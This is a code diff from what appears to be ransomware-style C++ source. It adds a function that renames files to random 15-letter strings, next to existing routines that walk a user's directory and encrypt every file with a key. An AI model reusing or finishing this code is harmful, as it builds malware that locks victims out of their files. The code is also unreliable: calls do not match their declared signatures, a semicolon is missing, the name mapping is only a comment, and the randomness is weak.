@@ -13,6 +13,8 @@ const int TAG_SIZE = 16; //bytes
 const int IV_SIZE = 16; //bytes
 
 void handleErrors(void);
+string RandomString(int ch);
+string filename_encryption(string filename);
 void encrypt_file(string filePath, string content, unsigned char *key);
 string decrypt_file(string filePath, unsigned char *key);
 
@@ -43,6 +45,26 @@ void encrypt_user_files(dir_path, key){
             encrypt_file(dp->d_name, key)
         (void)closedir(dirp);
     }
+}
+
+string RandomString(int ch)
+{
+    char letter[26] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g',
+                          'h', 'i', 'j', 'k', 'l', 'm', 'n',
+                          'o', 'p', 'q', 'r', 's', 't', 'u',
+                          'v', 'w', 'x', 'y', 'z' };
+    string random_str = "";
+    for (int i = 0; i<ch; i++)
+        random_str = random_str + letter[rand() % 26];
+
+    return random_str;
+}
+
+string filename_encryption(string filename){
+   srand(time(NULL));
+   string random_str = RandomString(15);
+   // map(filename, random_str)
+   return random_str;
 }
 
 void encrypt_file(string filePath, string content, unsigned char *key) {
